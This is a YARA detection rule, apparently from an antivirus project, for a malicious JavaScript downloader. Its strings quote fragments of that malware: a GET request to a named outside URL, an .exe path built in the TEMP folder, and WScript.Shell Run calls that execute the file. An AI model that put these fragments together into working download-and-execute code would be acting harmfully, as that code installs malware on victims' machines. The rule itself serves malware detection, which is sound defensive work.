rule sig_20160329_1fe24c6b4beb92928ff6f187bee379ff {
  meta:
    description = "datamaliciousorder - file 20160329_1fe24c6b4beb92928ff6f187bee379ff.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b37b967ca4814036bd26071e06927e44f396cb81bbf226bc1f8ae478b861f604"

  strings:
    $s1  = "WB[y](\"GET\", \"http://refindsexy.com/i8eps\", false);" fullword ascii
    $s2  = "function hP() {return p0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"2KP5XFrOx2MDH.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[z](o() * 11); if (WB[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var p0 = function lg() {return WScript[y0](\"WScript.Shell\");}(), eM = 11;" fullword ascii
    $s5  = "function gj(S0, Vr){lN = lN * 1; return S0 - Vr;};" fullword ascii
    $s6  = "function L(){return \"\" + gC;};" fullword ascii
    $s7  = "function o0(qN){p0[\"Run\"](qN, lN, lN);};" fullword ascii
    $s8  = "function h() {return ((D == true) && (D == R)) ? 1 : lN;};" fullword ascii
    $s9  = " while (p){" fullword ascii
    $s10 = "function l()" fullword ascii
    $s11 = "var iu = new this[\"Date\"]();" fullword ascii
    $s12 = "function YT(){return y0;};" fullword ascii
    $s13 = "function fI(HU) {var YN = (1, 2, 3, 4, 5, HU); return YN;};" fullword ascii
    $s14 = "return gj(e, SV);" fullword ascii
    $s15 = "function o(){return 22;};" fullword ascii
    $s16 = "var vT = false;" fullword ascii
    $s17 = "} catch(b){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}